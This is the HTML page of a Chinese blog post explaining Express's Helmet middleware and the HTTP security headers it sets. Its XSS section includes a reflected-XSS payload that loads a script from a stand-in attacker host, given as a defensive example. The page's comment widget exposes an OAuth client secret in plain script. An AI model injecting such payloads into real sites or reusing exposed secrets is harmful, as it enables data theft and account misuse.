
<!DOCTYPE>
<html lang="zh-cn" data-scribe-reduced-action-queue="true">
<head>
    <meta content='Express Helmet - Tate & Snow' name='title' />
    <meta content='Express Helmet - Tate & Snow' name='og:title' />
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
    <script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
    <title>Express Helmet - Tate & Snow</title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<title>Express Helmet - Tate & Snow</title>
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Express Helmet - Tate & Snow">
<meta name="twitter:keywords" content="Express Helmet - Tate & Snow" property='og:description' />
<meta property="og:type" content="article">
<meta property="og:title" content="Express Helmet - Tate & Snow">
<meta name="og:keywords" content="Express Helmet - Tate & Snow|Express Helmet什么是 HelmetHelmet 翻译为头盔，顾名思义，它的出现就是为了改善 Express 应用的安全性，具体方式是设置多种不同的 HTTP 头部信息:const express = require('e..."
  property='og:description' />
<link rel="icon" type="image/png" href="http://localhost:2333/style/favicons/favicon.ico" />
<link href="http://localhost:2333/style/favicons/favicon.ico" rel="shortcut icon" type="image/png">
<link rel="canonical" href="http://localhost:2333/">
<link rel="alternate" type="application/rss+xml" title="Liberxue" href="http://localhost:2333/feed.xml">
<meta charset="UTF-8">
<link rel="manifest" href="/manifest.json">
<link rel="shortcut icon" href="http://localhost:2333/style/favicons/favicon.ico" type="image/x-icon">
<meta name="keywords" content="Express Helmet什么是 HelmetHelmet 翻译为头盔，顾名思义，它的出现就是为了改善 Express 应用的安全性，具体方式是设置多种不同的 HTTP 头部信息:const express = require('e..." property='og:description'
/>
<meta name="description" content="Tate & Snow's Github blog" />
<link href="https://cdn.bootcss.com/highlight.js/9.10.0/styles/xcode.min.css" rel="stylesheet">
<link href="http://localhost:2333/style/theme.css" rel="stylesheet"> 
<meta content='http://localhost:2333/2019/06/06/express-helmet.html' property='og:url' />
<meta content="http://localhost:2333/2019/06/06/express-helmet.html|Express Helmet什么是 HelmetHelmet 翻译为头盔，顾名思义，它的出现就是为了改善 Express 应用的安全性，具体方式是设置多种不同的 HTTP 头部信息:const express = require('e..." property='og:description'
/>
<meta content="article" property="og:type" /> 

<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-136311746-1"></script>
<!-- <script async src="https://cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script> -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css"/>
<script>
  window.dataLayer = window.dataLayer || [];
  window.GA_TRACKING_ID = 'UA-136311746-1'
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
  gtag('set', {
    'country': 'US',
    'currency': 'USD',
    'description': 'fuck',
  });
  gtag('config', GA_TRACKING_ID, {
    'custom_map': {
      'dimension1': 'post_title',
    },
    'post_title': 'test',
  });
</script>
<meta content="" property="fb:app_id" />
<!-- Begin Jekyll SEO tag v2.6.1 -->
<title>Express Helmet | Tate &amp; Snow</title>
<meta name="generator" content="Jekyll v3.8.7" />
<meta property="og:title" content="Express Helmet" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Express Helmet" />
<meta property="og:description" content="Express Helmet" />
<link rel="canonical" href="http://localhost:2333/2019/06/06/express-helmet.html" />
<meta property="og:url" content="http://localhost:2333/2019/06/06/express-helmet.html" />
<meta property="og:site_name" content="Tate &amp; Snow" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2019-06-06T19:04:00+08:00" />
<script type="application/ld+json">
{"description":"Express Helmet","@type":"BlogPosting","url":"http://localhost:2333/2019/06/06/express-helmet.html","headline":"Express Helmet","dateModified":"2019-06-06T19:04:00+08:00","datePublished":"2019-06-06T19:04:00+08:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:2333/2019/06/06/express-helmet.html"},"@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->

<script>
  (function (d, s, id) {
    var js, fjs = d.getElementsByTagName(s)[0];
    if (d.getElementById(id)) return;
    js = d.createElement(s);
    js.id = id;
    js.src = "//connect.facebook.net/en_GB/all.js#xfbml=1&appId=";
    fjs.parentNode.insertBefore(js, fjs);
  }(document, 'script', 'facebook-jssdk'));
</script>

</head>

<body class="dark-theme" gtools_scp_screen_capture_injected="true">
    <header id="header" class="header bg-white">
        <div class="navbar-container">
            <a href="Javascript:;" onclick="onClickLogo()" title="访问 Tate & Snow" class="navbar-logo menu-logo">
                <img src="http://localhost:2333/style/images/tate.png" alt="Tate & Snow"> </a>
            <!-- <a href="/?tate" title="访问 Tate & Snow" class="navbar-logo">Tate & Snow</a>   -->
            <div class="navbar-menu">
                
                  <a class=" menu-item-categories " href="Javascript:;" onclick="onClickMenu('首页', '/')" title="访问 首页" data-hover="首页">首页</a>
                
                  <a class=" menu-item-categories " href="Javascript:;" onclick="onClickMenu('前端', '/front')" title="访问 前端" data-hover="前端">前端</a>
                
                  <a class=" menu-item-categories " href="Javascript:;" onclick="onClickMenu('历史', '/history')" title="访问 历史" data-hover="历史">历史</a>
                
                  <a class=" menu-item-categories " href="Javascript:;" onclick="onClickMenu('其他', '/other')" title="访问 其他" data-hover="其他">其他</a>
                
                  <a class=" menu-item-categories " href="Javascript:;" onclick="onClickMenu('标签', '/tags')" title="访问 标签" data-hover="标签">标签</a>
                
                  <a class=" menu-item-about " href="Javascript:;" onclick="onClickMenu('关于', '/README')" title="访问 关于" data-hover="关于">关于</a>
                
            </div>
            <!-- <div class="navbar-menu">
                
                <a href="http://localhost:2333/">首页</a>
                
                <a href="http://localhost:2333/front">前端</a>
                
                <a href="http://localhost:2333/history">历史</a>
                
                <a href="http://localhost:2333/other">其他</a>
                
                <a href="http://localhost:2333/tags">标签</a>
                
                <a href="http://localhost:2333/README">关于</a>
                
            </div> -->
            <div class="navbar-search menu-item-search" onclick="onClickSearch()">
                <span class="icon-search"></span>
                <form id="cb-search-btn" role="search">
                    <span class="search-box">
                        <input type="text" class="input" id="cb-search-content" required="true" placeholder="标题 标签..." maxlength="30" autocomplete="off">
                    </span>
                </form>
            </div>
            <div class="navbar-mobile-menu" onclick="">
                <span class="icon-menu cross">
                    <span class="middle"></span>
                </span>
                <ul>
                    
                    <li>
                        <a class="menu-item-categories" href="Javascript:;" onclick="onClickMenu('首页', 'http://localhost:2333/')">首页</a>
                    </li>
                    
                    <li>
                        <a class="menu-item-categories" href="Javascript:;" onclick="onClickMenu('前端', 'http://localhost:2333/front')">前端</a>
                    </li>
                    
                    <li>
                        <a class="menu-item-categories" href="Javascript:;" onclick="onClickMenu('历史', 'http://localhost:2333/history')">历史</a>
                    </li>
                    
                    <li>
                        <a class="menu-item-categories" href="Javascript:;" onclick="onClickMenu('其他', 'http://localhost:2333/other')">其他</a>
                    </li>
                    
                    <li>
                        <a class="menu-item-categories" href="Javascript:;" onclick="onClickMenu('标签', 'http://localhost:2333/tags')">标签</a>
                    </li>
                    
                    <li>
                        <a class="menu-item-categories" href="Javascript:;" onclick="onClickMenu('关于', 'http://localhost:2333/README')">关于</a>
                    </li>
                    
                </ul>
            </div>
        </div>
    </header>
    <a href="#header" class="back-to-top" onclick="onClickTop('Express Helmet')">⤴Top⤴</a>
    <div class="post-header-thumb bg-white}">
        <div class="post-header-thumb-op"></div>
        <div class="post-header-thumb">
            <div class="post-header-thumb-container">
                <h1 class="post-title" itemprop="name headline">
                    Express Helmet</h1>
                <div class="post-data">
                    <time datetime="2019-06-06 19:04:00" itemprop="datePublished">
                      发布时间：2019-06-06 19:04:00
                      &nbsp;&nbsp;&nbsp;
                      
                    </time>
                    <a onclick="onClickCategory('后端')" href="Javascript:;" title="访问 后端" data-hover="博客分类: 后端">博客分类: 后端</a>
                    <!-- <a href="#read"> 阅读次数: comments</a>  -->
                </div>
                <div class="post-tags">
                       
                    <a class="menu-item-tags" href="Javascript:;" onclick="onClickTag('Node')" title="访问Node" data-hover="Node">
                        Node
                        <span>(9)</span>
                        
                    </a>
                       
                </div>
            </div>
        </div>
    </div>
    <article class="main-content post-page" itemscope itemtype="http://schema.org/Article">
        <div class="post-header">
            <h1 class="post-title" itemprop="name headline">
                Express Helmet</h1>
            <div class="post-data">
                <time datetime="2019-06-06 19:04:00" itemprop="datePublished">2019-06-06 19:04:00</time>
            </div>
        </div>
        <div id="post-content" class="post-content" itemprop="articleBody">
            <p class="post-tags">
                   
                <a href="Javascript:;" onclick="onClickTag('Node')" title="访问Node" data-hover="Node">
                    Node
                    <span>(9)</span>
                    </a>
                   
            </p>
            <h1 id="express-helmet">Express Helmet</h1>

<h2 id="什么是-helmet">什么是 Helmet</h2>

<p><a href="https://helmetjs.github.io"><strong>Helmet</strong></a> 翻译为头盔，顾名思义，它的出现就是为了改善 Express 应用的安全性，具体方式是设置多种不同的 HTTP 头部信息:</p>

<pre><code class="language-JS">const express = require('express')
const helmet = require('helmet')

const app = express()

// Helmet will set various HTTP headers to help protect your app by default
// It’s best to use Helmet early in your middleware stack so that its headers are sure to be set
app.use(helmet())

// 或者禁用指定中间件
// app.use(helmet({
//   frameguard: false
// }))
</code></pre>

<p>Helmet 属于 13 个小型中间件的集合. 运行 <code class="highlighter-rouge">app.use(helmet())</code> 并不会默认使用所有的中间件:</p>

<table>
  <thead>
    <tr>
      <th>模块</th>
      <th>默认</th>
      <th> </th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><a href="https://helmetjs.github.io/docs/csp/"><strong>contentSecurityPolicy</strong></a></td>
      <td>for setting Content Security Policy</td>
      <td> </td>
    </tr>
    <tr>
      <td><a href="https://helmetjs.github.io/docs/dns-prefetch-control"><strong>dnsPrefetchControl</strong></a></td>
      <td>controls browser DNS prefetching</td>
      <td>✓</td>
    </tr>
    <tr>
      <td><a href="https://helmetjs.github.io/docs/expect-ct/"><strong>expectCt</strong></a></td>
      <td>for handling Certificate Transparency</td>
      <td> </td>
    </tr>
    <tr>
      <td><a href="https://helmetjs.github.io/docs/feature-policy/"><strong>featurePolicy</strong></a></td>
      <td>to limit your site’s features</td>
      <td> </td>
    </tr>
    <tr>
      <td><a href="https://helmetjs.github.io/docs/frameguard/"><strong>frameguard</strong></a></td>
      <td>to prevent clickjacking</td>
      <td>✓</td>
    </tr>
    <tr>
      <td><a href="https://helmetjs.github.io/docs/hide-powered-by/"><strong>hidePoweredBy</strong></a></td>
      <td>to remove the X-Powered-By header</td>
      <td>✓</td>
    </tr>
    <tr>
      <td><a href="https://helmetjs.github.io/docs/hsts/"><strong>hsts</strong></a></td>
      <td>for HTTP Strict Transport Security</td>
      <td>✓</td>
    </tr>
    <tr>
      <td><a href="https://helmetjs.github.io/docs/ie-no-open/"><strong>ieNoOpen</strong></a></td>
      <td>sets X-Download-Options for IE8+</td>
      <td>✓</td>
    </tr>
    <tr>
      <td><a href="https://helmetjs.github.io/docs/no-cache/"><strong>noCache</strong></a></td>
      <td>to disable client-side caching</td>
      <td> </td>
    </tr>
    <tr>
      <td><a href="https://helmetjs.github.io/docs/no-sniff/"><strong>noSniff</strong></a></td>
      <td>to keep clients from sniffing the MIME type</td>
      <td>✓</td>
    </tr>
    <tr>
      <td><a href="https://helmetjs.github.io/docs/permitted-cross-domain-policies/"><strong>permittedCrossDomainPolicies</strong></a></td>
      <td>for handling Adobe products’ crossdomain requests</td>
      <td> </td>
    </tr>
    <tr>
      <td><a href="https://helmetjs.github.io/docs/referrer-policy/"><strong>referrerPolicy</strong></a></td>
      <td>to hide the Referer header</td>
      <td> </td>
    </tr>
    <tr>
      <td><a href="https://helmetjs.github.io/docs/xss-filter/"><strong>xssFilter</strong></a></td>
      <td>adds some small XSS protections</td>
      <td>✓</td>
    </tr>
  </tbody>
</table>

<p>当然我们也可以对以上中间件进行单独设置:</p>

<pre><code class="language-JS">app.use(helmet.noCache())
app.use(helmet.frameguard())
</code></pre>

<p>下面就详细讲一下各个模块的使用，另外以下模块都支持独立引入，比如 <code class="highlighter-rouge">const csp = require('helmet-csp')</code>，前提是先安装哦 😯</p>

<h2 id="content-security-policy">Content Security Policy</h2>

<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP"><strong>Content Security Policy(内容安全策略)</strong></a> 简称 <strong>CSP</strong>，是通过设置请求头 <code class="highlighter-rouge">Content-Security-Policy</code> 来防止 XSS 攻击等，如果你的网站没有依赖任何外部字段，即自给自足型，那么请求头可以是这样:</p>

<pre><code class="language-TEXT">&lt;!-- only load things that are from my own domain --&gt;
Content-Security-Policy: default-src 'self'
</code></pre>

<p>再举个栗子，如果要使用 BootStrap 的 CSS 文件，那么请求头可以是这样:</p>

<pre><code class="language-TEXT">Content-Security-Policy: default-src 'self'; style-src 'self' maxcdn.bootstrapcdn.com
</code></pre>

<p>对应于我们代码上的设置为:</p>

<pre><code class="language-JS">app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    styleSrc: ["'self'", 'maxcdn.bootstrapcdn.com']
  }
}))
</code></pre>

<p>这里再介绍一个指令 <code class="highlighter-rouge">frame-ancestors</code>，可以指定有效的父级使用嵌入，如 <code class="highlighter-rouge">&lt;iframe&gt;</code>、<code class="highlighter-rouge">&lt;embed&gt;</code> 和 <code class="highlighter-rouge">&lt;applet&gt;</code> 等:</p>

<pre><code class="language-JS">// 只能通过以下指定域名通过 iframe 等嵌入，否则会报错
frameAncestors: ['https://trusted.cn', 'https://anotherTrusted.cn']
</code></pre>

<blockquote>
  <p>directives 更多指令配置<a href="https://helmetjs.github.io/docs/csp/">请查看这里</a> 👈</p>
</blockquote>

<p>如果对于一些页面要单独去设置 CSP，我们可以利用 <a href="https://github.com/helmetjs/content-security-policy-builder"><strong>Content Security Policy builder</strong></a> 去将上面的指令转换为请求信息里的字符串:</p>

<pre><code class="language-JS">const builder = require('content-security-policy-builder')

// default-src 'self' default.com; script-src scripts.com; whatever-src something; object-src
const directives = {
  defaultSrc: ["'self'", 'default.com'],
  scriptSrc: 'scripts.com',
  'whatever-src': 'something',
  objectSrc: true
}

// 直接通过 setHeader 方法设置 CSP
const helmetConfigCsp = res =&gt; res.setHeader('Content-Security-Policy', cspBuilder({ directives }))
</code></pre>

<h2 id="dns-prefetch-control">DNS Prefetch Control</h2>

<p><a href="https://developer.mozilla.org/zh-CN/docs/Controlling_DNS_prefetching"><strong>DNS prefetching</strong></a> 即 <strong>DNS 预读取</strong>，它是一项使浏览器主动去执行域名解析的功能，其范围包括文档的所有链接。可以通过设置 <code class="highlighter-rouge">X-DNS-Prefetch-Control</code> 头部信息来防止该攻击。</p>

<p>When you visit a URL, your browser has to look up the domain’s IP address. For example, it has to resolve example.com to 93.184.216.34. This process is called DNS.</p>

<p>Browsers can start these DNS requests before the user even clicks a link or loads a resource from somewhere. This improves performance when the user clicks the link, but has privacy implications for users. It can appear as if a user is visiting things they aren’t visiting.</p>

<pre><code class="language-JS">// Sets "X-DNS-Prefetch-Control: off".
app.use(dnsPrefetchControl())

// Sets "X-DNS-Prefetch-Control: off".
app.use(dnsPrefetchControl({ allow: false }))

// Sets "X-DNS-Prefetch-Control: on".
app.use(dnsPrefetchControl({ allow: true }))
</code></pre>

<h2 id="frameguard">Frameguard</h2>

<p>In short: Frameguard mitigates <a href="https://helmetjs.github.io/docs/frameguard/"><strong>clickjacking attacks</strong></a> by setting the <code class="highlighter-rouge">X-Frame-Options header</code>.</p>

<p>clickjacking attacks 总而言之就是点击劫持，诱导你点击不可见的 iframe，比如一些你并不想看到的广告啊或者什么，我们可以这样设置:</p>

<pre><code class="language-JS">// Don't allow me to be in ANY frames.
// Sets "X-Frame-Options: DENY".
app.use(frameguard({ action: 'deny' }))

// Only let me be framed by people of the same origin.
// Sets "X-Frame-Options: SAMEORIGIN".
app.use(frameguard({ action: 'sameorigin' }))
app.use(frameguard())  // defaults to sameorigin

// Allow from a specific host.
// Sets "X-Frame-Options: ALLOW-FROM http://example.com".
app.use(frameguard({
  action: 'allow-from',
  domain: 'http://example.com'
}))
</code></pre>

<h2 id="hide-powered-by">Hide Powered-By</h2>

<p><strong>Hide Powered-By</strong> 可以移除 <code class="highlighter-rouge">X-Powered-By</code> 首部字段，其表明了用于支持当前网页应用程序的技术，显然这些信息是不要被黑客们看到的好，那么我们可以这样设置:</p>

<pre><code class="language-JS">app.use(helmet.hidePoweredBy())
</code></pre>

<p>当然你还可以抛出一个假的技术(太坏了 😀)，大家都以为是基于 php 写的:</p>

<pre><code class="language-JS">app.use(helmet.hidePoweredBy({ setTo: 'PHP 4.2.0' }))
</code></pre>

<h2 id="hsts">HSTS</h2>

<p>In short: this module sets the <code class="highlighter-rouge">Strict-Transport-Security</code> header to keep your users on HTTPS.</p>

<p>The <code class="highlighter-rouge">Strict-Transport-Security</code> HTTP header tells browsers to stick with HTTPS and never visit the insecure HTTP version. Once a browser sees this header, it will only visit the site over HTTPS for the next 60 days:</p>

<pre><code class="language-TEXT">Strict-Transport-Security: max-age=5184000
</code></pre>

<p>为了确保在访问 HTTPS 网站时不出现协议降级(回到 HTTP)的情况，我们可以这样去设置:</p>

<pre><code class="language-JS">app.use(helmet.hsts({
  maxAge: 7776000000,
  includeSubDomains: true
}))
</code></pre>

<h2 id="ie-no-open">IE No Open</h2>

<p>In short: this middleware sets the <code class="highlighter-rouge">X-Download-Options</code> to prevent Internet Explorer from executing downloads in your site’s context.</p>

<p>简而言之，就是为了防止低版本 IE 乱打开不受信任的东西(HTML files)，我们可以这样设置:</p>

<pre><code class="language-JS">// Sets "X-Download-Options: noopen".
app.use(helmet.ieNoOpen())
</code></pre>

<h2 id="no-cache">No Cache</h2>

<p>一般情况下不会去用，但是有时候为了担心旧文件有漏洞，而更新后由于浏览器缓存导致旧文件还能访问，让黑客有可趁之机，这个中间件会自动去设置 <code class="highlighter-rouge">Cache-Control</code>, <code class="highlighter-rouge">Surrogate-Control</code>, <code class="highlighter-rouge">Pragma</code> 和 <code class="highlighter-rouge">Expires</code> 等相关字段:</p>

<pre><code class="language-JS">app.use(helmet.noCache())
</code></pre>

<h2 id="dont-sniff-mimetype">Don’t Sniff Mimetype</h2>

<p>In short: the Don’t Sniff Mimetype middleware, <strong>noSniff</strong>, helps prevent browsers from trying to guess (“sniff(嗅探)”) the MIME type, which can have security implications. It does this by setting the <code class="highlighter-rouge">X-Content-Type-Options</code> header to nosniff.</p>

<p><strong>MIME types</strong> are a way of determining what kind of file you’re looking at. PNG images have the type image/png; JSON files are application/json; JavaScript files are typically text/javascript. When your browser loads a file, it reads the server’s Content-Type header to determine what the thing is.</p>

<p>This MIME sniffing can be an attack vector. A user could upload an image with the .jpg file extension but its contents are actually HTML. Visiting that image could cause the browser to “run” the HTML page, which could contain malicious JavaScript! Perhaps the nastiest attack is called Rosetta Flash, which allows someone to load a malicious Flash plugin instead of data</p>

<pre><code class="language-JS">// Sets "X-Content-Type-Options: nosniff".
app.use(helmet.noSniff())
</code></pre>

<h2 id="referrer-policy">Referrer Policy</h2>

<p>In short: the <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Referrer-Policy"><strong>Referrer Policy</strong></a> module can control the behavior of the Referer header by setting the <code class="highlighter-rouge">Referrer-Policy</code> header:</p>

<ul>
  <li>no-referrer - 整个 Referer 首部会被移除。访问来源信息不随着请求一起发送。</li>
  <li>no-referrer-when-downgrade - 默认。在同等安全级别的情况下，引用页面的地址会被发送(HTTPS -&gt; HTTPS)，但是在降级的情况下不会被发送 (HTTPS -&gt; HTTP)</li>
  <li>origin - 在任何情况下，仅发送文件的源作为引用地址。例如 <code class="highlighter-rouge">https://example.com/page.html</code> 会将 <code class="highlighter-rouge">https://example.com/</code> 作为引用地址</li>
  <li>origin-when-cross-origin - 对于同源的请求，会发送完整的 URL 作为引用地址，但是对于非同源请求仅发送文件的源</li>
  <li>same-origin - 对于同源的请求会发送引用地址，但是对于非同源请求则不发送引用地址信息</li>
  <li>strict-origin - 在同等安全级别的情况下，发送文件的源作为引用地址(HTTPS -&gt; HTTPS)，但是在降级的情况下不会发送 (HTTPS -&gt; HTTP)</li>
  <li>strict-origin-when-cross-origin - 对于同源的请求，会发送完整的 URL 作为引用地址；在同等安全级别的情况下，发送文件的源作为引用地址(HTTPS -&gt; HTTPS)；在降级的情况下不发送此首部 (HTTPS -&gt; HTTP)</li>
  <li>unsafe-url - 无论是同源请求还是非同源请求，都发送完整的 URL(移除参数信息之后)作为引用地址</li>
</ul>

<p><strong>Referer</strong> 是 web 浏览器设置的告诉服务器该请求的来源，同样这样会泄露信息，因此我们可以这样设置:</p>

<pre><code class="language-JS">// Sets "Referrer-Policy: same-origin".
app.use(helmet.referrerPolicy({ policy: 'same-origin' }))

// Sets "Referrer-Policy: unsafe-url".
app.use(helmet.referrerPolicy({ policy: 'unsafe-url' }))

// Sets "Referrer-Policy: no-referrer,unsafe-url"
app.use(helmet.referrerPolicy({
  policy: ['no-referrer', 'unsafe-url']
}))

// Sets "Referrer-Policy: no-referrer".
// 注意这里的默认是 no-referrer，而不是 no-referrer-when-downgrade
app.use(helmet.referrerPolicy())
</code></pre>

<blockquote>
  <p>注意 Referer 实际上是单词 “referrer” 的错误拼写。Referrer-Policy 这个首部并没有延续这个错误拼写。</p>
</blockquote>

<h2 id="xss-filter">XSS Filter</h2>

<p>In short: the xssFilter middleware sets the <code class="highlighter-rouge">X-XSS-Protection</code> header to prevent reflected XSS attacks.</p>

<p>举个栗子，比如我们正常搜索某句话:</p>

<p><img src="https://helmetjs.github.io/docs/xss-filter/xss-filter-ok.png" alt="xss-filter-ok" /></p>

<p>当我们搜索 <code class="highlighter-rouge">&lt;script src="http://evil.example.com/steal-data.js"&gt;&lt;/script&gt;</code> 的时候，url 可能会变为: <code class="highlighter-rouge">https://goober.example.com/search?query=&lt;script%20src="http://evil.example.com/steal-data.js"&gt;&lt;/script&gt;</code>，页面会变成下面这样子，然后一个可能怀有恶意的 JS 文件就被触发了 🙀:</p>

<p><img src="https://helmetjs.github.io/docs/xss-filter/xss-filter-malicious.png" alt="xss-filter-malicious" /></p>

<pre><code class="language-JS">// Sets "X-XSS-Protection: 1; mode=block".
app.use(helmet.xssFilter())
</code></pre>

<blockquote>
  <p>这个 header 可以设置三种不同的值: <code class="highlighter-rouge">0</code>、<code class="highlighter-rouge">1</code> 和 <code class="highlighter-rouge">1; mode=block</code>，具体区别<a href="https://blog.innerht.ml/the-misunderstood-x-xss-protection/">请参考这里</a> 👈</p>
</blockquote>

<h2 id="参考链接">参考链接</h2>

<ol>
  <li><a href="http://www.ruanyifeng.com/blog/2016/09/csp.html">Content Security Policy 入门教程</a> By 阮一峰</li>
  <li><a href="https://juejin.im/post/5a24fd8f51882509e5438247">为你的网站带上帽子 — 使用 helmet 保护 Express 应用</a> By Isvih</li>
</ol>
 
<div id="gitalk-container"></div>
<script>
    var gitalk = new Gitalk({
      enable: true,
      clientID: '020f142489f80c92b097',
      clientSecret: '1fa083372b44031cf1b8249251515c4e3d54c69d',
      repo: 'tate-young.github.io',
      owner: 'Tate-Young',
      admin: ['Tate-Young'],
      id: location.pathname,      // Ensure uniqueness and length less than 50
      distractionFreeMode: false  // Facebook-like distraction free mode
    })

    gitalk.render('gitalk-container')
</script>
<!-- disqus -->
<!-- <div id="disqus_thread"></div>
<script>
    /**
     *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
     *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
     */

    var disqus_config = function () {
        this.page.url = 'https://tate-young.github.io/2019/06/06/express-helmet.html';
        this.page.identifier = '/2019/06/06/express-helmet';
        this.page.title = 'Express Helmet';
    };

    (function () { // REQUIRED CONFIGURATION VARIABLE: EDIT THE SHORTNAME BELOW
        var d = document,
            s = d.createElement('script');

        s.src = '//tate.disqus.com/embed.js'; // IMPORTANT: Replace EXAMPLE with your forum shortname!

        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the
    <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
</noscript> -->


            <!-- <p class="post-info">
			本文由 <a href="/">liberxue</a> 创作，采用 <a href="https://creativecommons.org/licenses/by/4.0/" target="_blank" rel="external nofollow">知识共享署名4.0</a> 国际许可协议进行许可<br>本站文章除注明转载/出处外，均为本站原创或翻译，转载前请务必署名<br>最后编辑时间为:2019-06-06 19:04:00</p> -->
        </div>
    </article>

    <!-- <div class="related-post-lists">
	<div class="post-lists">
		<div class="post-lists-body">
					<div class="post-list-item">
				<div class="post-list-item-container">
					<div class="item-label">
						<div class="item-title"><a href="induction.html">归纳的随想</a></div>
						<div class="item-meta clearfix">
														<div class="item-meta-ico bg-ico-image" style="background: url('../usr/themes/pinghsu/images/bg-ico.png') no-repeat;background-size: 40px auto;"></div>
	                        							<div class="item-meta-cat"><a href="../category/thoughts/index.html">Thoughts</a></div>
						</div>
					</div>
				</div>
			</div>
				</div>
	</div>
</div> -->

    <!-- <footer class="footer bg-white">
	<div class="footer-social">
		<div class="footer-container clearfix">
			<div class="social-list">
	 <a class="social segmentfault" target="blank" href="https://segmentfault.com/u/liberxue" title="访问 LiberXue_Twitter" data-hover="Segmentfault">Segmentfault</a>
    <a class="social github" target="blank" href="https://github.com/liberxue" title="访问 LiberXue_Twitter" data-hover="GitHub">GitHub</a>
    <a class="social twitter" target="blank" href="http://twitter.com/liberxue" title="访问 LiberXue_Twitter" data-hover="Twitter">Twitter</a>
     <a class="social stackoverflow" target="blank" href="https://stackoverflow.com/users/6902190/liberxue" title="访问 LiberXue_stackoverflow" data-hover="StackOverflow">StackOverflow</a>
          <a class="social oschina" target="blank" href="https://my.oschina.net/bolanzw" title="访问 LiberXue_Oschina" data-hover="Oschina">Oschina</a>
     <a class="social rss" target="blank" href="/feed.xml"title="访问 LiberXue_RSS" data-hover="RSS">RSS</a>
	</div>
		</div>
	</div>
	<div class="footer-meta">
        <div class="footer-container">
            <div class="meta-item meta-copyright">
                <div class="meta-copyright-info">
                    <a href="/" class="info-logo">
                         <img src="http://localhost:2333/style/images/logo-liberxue.png"   title="访问 LiberXue_blog" data-hover="LiberXue_blog" alt="LiberXue_blog" /> </a>
                    <div class="info-text">
                        <p>Theme is <a href="http://www.liberxue.com/2017/08/03/Jekyllthemes.html" title="访问 Jekyll liberxue主题"  data-hover="Jekyll liberxue"target="_blank">Jekyll liberxue</a> by <a href="http://www.liberxue.com/about" target="_blank">liberxue</a></p>
                        <p>Powered by <a href="http://localhost:2333/tags/#Jekyll" title="Jekyll" data-hover="Jekyll" target="_blank" rel="nofollow">Jekyll</a></p>
                        <p>&copy; 2017 <a href="/feed.xml"  title="访问 liberxue blog RSS" data-hover="liberxue blog RSS">liberxue blog RSS</a></p>
                        <p>总计文章：篇</p>
                      <p>本blog已开源点击Fork</p><iframe src="http://ghbtns.com/github-btn.html?user=liberxue&repo=liberxue.github.io&type=fork&count=true" allowtransparency="true" frameborder="0" scrolling="0" width="95" height="20"></iframe>
                    </div>
                </div>
            </div>
            <div class="meta-item meta-posts">
                <h3 class="meta-title">置顶文章</h3>
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
            </div>
            <div class="meta-item meta-comments">
                <h3 class="meta-title">最新文章</h3>
  
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
</div>
		</div>
    </div>
</footer> -->
<script src="//cdn.bootcss.com/jquery/2.2.2/jquery.min.js"></script>
<script src="//cdn.bootcss.com/bootstrap-3-typeahead/4.0.2/bootstrap3-typeahead.js"></script>
<script async src="/search/js/520.js"></script>
<script async src="/search/js/gtag.js"></script>
<script async src="/search/live2d/autoload.js"></script>
<!-- <script src="/search/js/canvas.js"></script> -->

<script>
    $(function () {
        setTimeout(function () {
            $('code').removeClass('hljs');
            $('code').removeClass('language');
        }, 90);
    });
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    <!--liberxueconnnet-menu-->
    <div id="directory-content" class="directory-content">
        <div id="directory"></div>
    </div>
    <!--liberxueconnnet-menu-->
    <script>
      const directoryContainer = document.getElementById('directory')
      const postTitle = document.getElementsByClassName('post-title')[0]
      var postDirectoryBuild = function () {
        var postChildren = function children(childNodes, reg) {
          var result = [],
              isReg = typeof reg === 'object',
              isStr = typeof reg === 'string',
              node, i, len;
          for (i = 0, len = childNodes.length; i < len; i++) {
            node = childNodes[i];
            if ((node.nodeType === 1 || node.nodeType === 9) &&
              (!reg ||
                  isReg && reg.test(node.tagName.toLowerCase()) ||
                  isStr && node.tagName.toLowerCase() === reg)) {
                result.push(node);
              }
            }
            return result;
          },
          createPostDirectory = function (article, directory, isDirNum) {
            var contentArr = [],
                titleId = [],
                levelArr, root, level,
                currentList, list, li, link, i, len;
            levelArr = (function (article, contentArr, titleId) {
                  var titleElem = postChildren(article.childNodes, /^h\d$/),
                      levelArr = [],
                      lastNum = 1,
                      lastRevNum = 1,
                      count = 0,
                      guid = 1,
                      id = 'directory' + (Math.random() + '').replace(/\D/, ''),
                      lastRevNum, num, elem;
                  while (titleElem.length) {
                      elem = titleElem.shift();
                      contentArr.push(elem.innerHTML);
